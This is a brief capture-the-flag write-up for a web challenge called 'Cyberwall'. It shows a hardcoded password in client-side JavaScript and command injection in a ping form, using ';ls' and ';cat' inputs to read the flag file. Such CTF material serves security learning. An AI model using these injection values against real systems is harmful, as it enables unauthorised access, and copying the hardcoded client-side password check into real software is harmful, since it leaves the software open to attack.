# Cyberwall

## Task

We had problems with hackers, but now we got a enterprise firewall system build by a leading security company.

http://chal.cybersecurityrumble.de:3812/

## Solution

The `Tsisko` front page wants a password. On login there is no request so the check has to be in the javascript.

```javascript
function checkPw() {
  var pass = document.getElementsByName('passwd')[0].value;
  if (pass != "rootpw1337") {
    alert("This Password is invalid!");
    return false;
  }
  window.location.replace("management.html");
}
```

Now we are past the first stage.

There are 4 fun pages to see and a `Debugging` tap where we can do a `Test Host Connection` with ping.

Let's just do `;ls` as the hostname.

```
requirements.txt
static
super_secret_data.txt
templates
webapp.py
wsgi.py
```

Another `;cat super_secret_data.txt` did the trick: `CSR{oh_damnit_should_have_banned_curl_https://news.ycombinator.com/item?id=19507225}`
